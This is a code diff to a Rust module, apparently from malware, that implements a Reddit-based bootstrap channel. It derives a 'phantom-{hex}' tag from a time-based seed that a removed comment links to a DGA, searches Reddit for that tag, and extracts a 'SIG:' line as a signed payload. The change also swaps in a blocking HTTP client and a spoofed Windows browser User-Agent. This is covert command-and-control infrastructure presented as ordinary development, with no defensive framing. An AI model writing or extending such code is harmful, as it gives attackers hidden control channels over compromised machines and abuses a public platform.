@@ -1,5 +1,3 @@
-use async_trait::async_trait;
-use reqwest::Client;
 use std::error::Error;
 use std::time::{SystemTime, UNIX_EPOCH};
 use log::debug;
@@ -22,7 +20,6 @@ impl RedditProvider {
         state ^= state >> 7;
         state ^= state << 17;
         
-        // Tag format: "phantom-{hex}" (same seed as DGA but different usage)
         format!("phantom-{:x}", state & 0xFFFF) 
     }
 }
@@ -44,32 +41,27 @@ struct RedditChild {
 
 #[derive(Deserialize)]
 struct RedditContent {
-    selftext: Option<String>, // For posts
-    body: Option<String>,     // For comments
+    selftext: Option<String>,
+    body: Option<String>,
 }
 
-#[async_trait]
 impl BootstrapProvider for RedditProvider {
-    async fn fetch_payload(&self, client: &Client) -> Result<String, Box<dyn Error + Send + Sync>> {
+    fn fetch_payload(&self) -> Result<String, Box<dyn Error + Send + Sync>> {
         let tag = self.generate_tag();
         debug!("[Bootstrap] Reddit Searching Tag: {}", tag);
         
-        // Search for posts/comments containing the tag
         let url = format!("https://www.reddit.com/search.json?q={}&sort=new&limit=5", tag);
         
-        // Reddit requires a unique User-Agent
-        let resp = client.get(&url)
-            .send()
-            .await?
-            .json::<RedditListing>()
-            .await?;
+        let resp: RedditListing = ureq::get(&url)
+            .timeout(std::time::Duration::from_secs(15))
+            .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+            .call()?
+            .into_json()?;
 
         for child in resp.data.children {
             let content = child.data.selftext.or(child.data.body).unwrap_or_default();
             
-            // Look for "SIG:..." pattern in the content
             if content.contains("SIG:") && content.contains("MSG:") {
-                 // Extract valid payload if mixed with other text
                  for line in content.lines() {
                      if line.contains("SIG:") {
                          return Ok(line.trim().to_string());
